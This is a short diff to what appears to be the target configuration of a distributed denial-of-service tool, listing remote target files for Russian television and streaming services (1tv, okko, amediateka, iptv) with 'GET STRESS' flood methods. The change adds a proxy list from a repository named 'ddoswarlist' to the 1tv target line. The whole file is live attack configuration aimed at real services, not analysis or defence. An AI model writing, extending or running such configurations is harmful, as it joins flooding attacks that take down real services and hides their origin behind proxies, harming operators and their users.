@@ -5,6 +5,6 @@
 #-c https://raw.githubusercontent.com/girador/res/main/amediateka.txt
 #-c https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/girador/res/main/1tv.txt --http-methods GET STRESS
+-c https://raw.githubusercontent.com/girador/res/main/1tv.txt --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
 -c https://raw.githubusercontent.com/girador/res/main/okko.txt --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
 -c https://raw.githubusercontent.com/girador/res/main/iptv.txt --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
